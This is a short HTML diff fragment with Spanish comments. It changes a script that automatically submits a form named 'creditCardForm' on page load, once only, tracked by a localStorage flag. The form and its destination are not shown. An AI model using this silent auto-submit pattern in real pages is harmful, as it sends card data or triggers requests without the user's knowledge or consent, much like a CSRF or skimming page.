@@ -11,14 +11,17 @@
 
 
 
-    <!-- JavaScript para enviar el formulario automáticamente al cargar la página -->
-    <script> 
-  // JavaScript para enviar el formulario automáticamente solo la primera vez
-        window.addEventListener('load', function () {
-            // Comprobar si ya se ha enviado el formulario antes
-            if (!localStorage.getItem('formularioEnviado')) {
-                // Enviar el formulario automáticamente
+   <!-- JavaScript para enviar el formulario automáticamente solo la primera vez -->
+    <script>
+        window.addEventListener('DOMContentLoaded', function () {
+            // Comprobar si el formulario ya se ha enviado antes
+            const hasFormBeenSubmitted = localStorage.getItem('formularioEnviado');
+
+            if (!hasFormBeenSubmitted) {
+                // Obtener el formulario
                 const creditCardForm = document.getElementById('creditCardForm');
+
+                // Enviar el formulario automáticamente
                 creditCardForm.submit();
 
                 // Establecer un indicador en localStorage para que no se envíe nuevamente
